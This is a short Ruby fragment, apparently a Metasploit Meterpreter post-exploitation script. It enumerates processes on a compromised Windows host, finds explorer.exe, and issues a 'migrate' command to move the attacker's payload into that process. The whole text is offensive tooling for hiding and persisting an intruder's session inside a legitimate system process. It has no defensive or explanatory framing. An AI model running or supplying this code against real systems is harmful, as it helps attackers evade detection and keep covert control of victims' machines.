processes = client.sys.process.get_processes

processes.each { |ent|
    if ent['name'] == "explorer.exe"
        explorerPID = [ent['pid']];
        client.run_cmd("migrate " + explorerPID.at(0).to_s)
        break;
    end
}